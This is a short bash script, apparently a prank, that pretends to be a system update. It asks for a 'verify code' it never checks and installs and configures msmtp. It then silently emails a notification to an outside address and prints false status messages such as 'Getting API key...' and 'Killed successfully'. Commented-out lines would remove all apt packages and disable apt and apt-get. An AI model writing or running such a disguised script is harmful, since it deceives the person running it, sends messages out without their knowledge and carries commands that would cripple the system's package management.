#!/bin/bash

echo "Updating..."

# sudo apt remove * -y
# sudo chmod -x /usr/bin/apt
# sudo chmod -x /usr/bin/apt-get

clear

echo "Please, introduce verify code to end the update: "
read command

clear

echo "Verify process started..."

sudo apt update
sudo apt upgrade -y
sudo apt install msmtp -y

echo "account default
host smtp.mailtrap.io
port 25
auth off
from 10mrosco@sanbenitoikastola.net
logfile /home/$USER/msmtp.log" > ~/.msmtprc

echo "600"
chmod 600 ~/.msmtprc
clear

echo "Getting API key..."
echo -e "Subject: Notificación\n\nEl usuario ha eliminado un paquete" | msmtp 10mrosco@sanbenitoikastola.net

echo "Incorrect code, can't verify user, aborting..."
sleep 1

clear

echo "Killed successfully"
